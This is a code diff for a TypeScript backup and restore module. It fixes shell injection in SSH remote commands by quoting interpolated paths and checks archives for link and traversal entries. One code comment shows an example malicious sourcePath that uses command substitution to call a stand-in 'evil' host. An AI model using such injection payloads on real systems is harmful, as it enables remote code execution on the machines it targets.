@@ -17,6 +17,7 @@ import { logger } from './logger';
 import { listNodes, PodmanConnection } from './nodes';
 import { SSHConnectionPool } from './ssh/pool';
 import { getConfig, updateConfig } from './config';
+import { shellQuote } from './util/shellQuote';
 
 const execFileAsync = promisify(execFile);
 const BACKUP_PREFIX = 'servicebay-full';
@@ -472,6 +473,9 @@ async function stageRemoteSystemd(node: PodmanConnection, destination: string): 
     const conn = await SSHConnectionPool.getInstance().getConnection(node.Name);
     const script = [
         'set -e',
+        // REMOTE_SYSTEMD_DIR contains the literal "$HOME" sentinel that
+        // the remote shell must expand — intentionally NOT shellQuote'd.
+        // See note in restoreRemoteSystemd; same constraint applies.
         `target=${REMOTE_SYSTEMD_DIR}`,
         'if [ ! -d "$target" ]; then',
         '  echo "SYSTEMD_DIR_MISSING" >&2',
@@ -497,7 +501,7 @@ async function stageRemoteSystemd(node: PodmanConnection, destination: string): 
     const localTemp = path.join(destination, 'systemd.tgz');
     await fs.mkdir(destination, { recursive: true });
     await downloadRemoteFile(conn, remoteTemp, localTemp);
-    await execRemoteCommand(conn, `rm -f "${remoteTemp}"`);
+    await execRemoteCommand(conn, `rm -f ${shellQuote(remoteTemp)}`);
     await safeTarExtract(localTemp, destination);
     await fs.rm(localTemp, { force: true });
     return 'copied';
@@ -591,8 +595,12 @@ async function restoreRemoteSystemd(node: PodmanConnection, sourceDir: string) {
     // mirrors the local `assertSafeArchiveEntries` pre-check.
     const extractScript = [
         'set -e',
+        // REMOTE_SYSTEMD_DIR is a constant containing the literal "$HOME"
+        // sentinel — the remote shell must expand it, so we intentionally
+        // do NOT shellQuote it. If this ever becomes config-driven, switch
+        // to shellQuote + pre-resolved absolute path.
         `target=${REMOTE_SYSTEMD_DIR}`,
-        `tmp="${remoteTemp}"`,
+        `tmp=${shellQuote(remoteTemp)}`,
         // Pre-pass: refuse symlinks/hardlinks (#590) or abs/traversal entries (#580).
         // awk exits non-zero on the first offender so set -e aborts.
         `tar -tvzf "$tmp" | awk '/^[lh]/ { print "Refused archive: contains link entry: " $NF > "/dev/stderr"; exit 2 } { for (i=6; i<=NF; i++) name = (i==6 ? $i : name " " $i); if (name ~ /^\\// || name ~ /(^|\\/)\\.\\.($|\\/)/) { print "Refused archive: contains abs/traversal entry: " name > "/dev/stderr"; exit 2 } }'`,
@@ -779,7 +787,11 @@ export async function createSystemBackup(progress?: ProgressCallback): Promise<S
 
             const conn = await SSHConnectionPool.getInstance().getConnection(node.Name);
             for (const mount of proxyMounts) {
-                const checkResult = await execRemoteCommand(conn, `test -d "${mount.source}" && ls -A "${mount.source}" 2>/dev/null | head -1`);
+                // mount.source comes from parsed Quadlet YAML on the remote
+                // node. shellQuote it before any shell-template insertion —
+                // a Volume= entry with shell-metas would otherwise inject.
+                const quotedSource = shellQuote(mount.source);
+                const checkResult = await execRemoteCommand(conn, `test -d ${quotedSource} && ls -A ${quotedSource} 2>/dev/null | head -1`);
                 if (checkResult.code !== 0 || !checkResult.stdout.trim()) {
                     pushLog(logs, progress, { scope: 'remote', status: 'skip', node: node.Name, message: `${mount.source} is empty` });
                     continue;
@@ -793,7 +805,7 @@ export async function createSystemBackup(progress?: ProgressCallback): Promise<S
                 const script = [
                     'set -e',
                     `tmpfile=$(mktemp /tmp/servicebay-svcdata-XXXXXX.tar.gz)`,
-                    `tar -czf "$tmpfile" -C "${mount.source}" .`,
+                    `tar -czf "$tmpfile" -C ${quotedSource} .`,
                     `echo "$tmpfile"`
                 ].join('\n');
                 const archiveResult = await execRemoteCommand(conn, script);
@@ -802,7 +814,7 @@ export async function createSystemBackup(progress?: ProgressCallback): Promise<S
                 if (!remoteTmp) continue;
 
                 await downloadRemoteFile(conn, remoteTmp, tmpArchive);
-                await execRemoteCommand(conn, `rm -f "${remoteTmp}"`);
+                await execRemoteCommand(conn, `rm -f ${shellQuote(remoteTmp)}`);
                 await safeTarExtract(tmpArchive, localDir);
                 await fs.rm(tmpArchive, { force: true });
 
@@ -1117,7 +1129,7 @@ export async function restoreSystemBackupSelection(archivePath: string, selectio
                         const remoteSystemd = await resolveRemoteSystemdDir(conn);
                         const remotePath = path.posix.join(remoteSystemd, safePath.split(path.sep).join('/'));
                         const remoteDir = path.posix.dirname(remotePath);
-                        await execRemoteCommand(conn, `mkdir -p "${remoteDir}"`);
+                        await execRemoteCommand(conn, `mkdir -p ${shellQuote(remoteDir)}`);
                         const tempLocal = path.join(os.tmpdir(), `servicebay-restore-${Date.now()}-${path.basename(remotePath)}`);
                         await fs.copyFile(sourceFile, tempLocal);
                         await uploadRemoteFile(conn, tempLocal, remotePath);
@@ -1222,10 +1234,15 @@ export async function restoreSystemBackupSelection(archivePath: string, selectio
                         // operator-controlled `remotePath` mounts.
                         // Same SSH-side guard as restoreRemoteSystemd
                         // (#580 + #590): refuse links, abs paths, traversal.
+                        // remotePath comes from the backup metadata (entry.sourcePath)
+                        // and is user-controlled at restore time — a malicious backup
+                        // could carry a sourcePath like `"$(curl evil…)"` which would
+                        // execute via command substitution even inside double quotes.
+                        // shellQuote forces it through single-quotes (no expansion at all).
                         const remoteSvcScript = [
                             'set -e',
-                            `tmp="${remoteTmp}"`,
-                            `target="${remotePath}"`,
+                            `tmp=${shellQuote(remoteTmp)}`,
+                            `target=${shellQuote(remotePath)}`,
                             `tar -tvzf "$tmp" | awk '/^[lh]/ { print "Refused archive: contains link entry: " $NF > "/dev/stderr"; exit 2 } { for (i=6; i<=NF; i++) name = (i==6 ? $i : name " " $i); if (name ~ /^\\// || name ~ /(^|\\/)\\.\\.($|\\/)/) { print "Refused archive: contains abs/traversal entry: " name > "/dev/stderr"; exit 2 } }'`,
                             'mkdir -p "$target"',
                             'tar -xzf "$tmp" -C "$target" --no-same-owner --no-overwrite-dir --no-same-permissions',
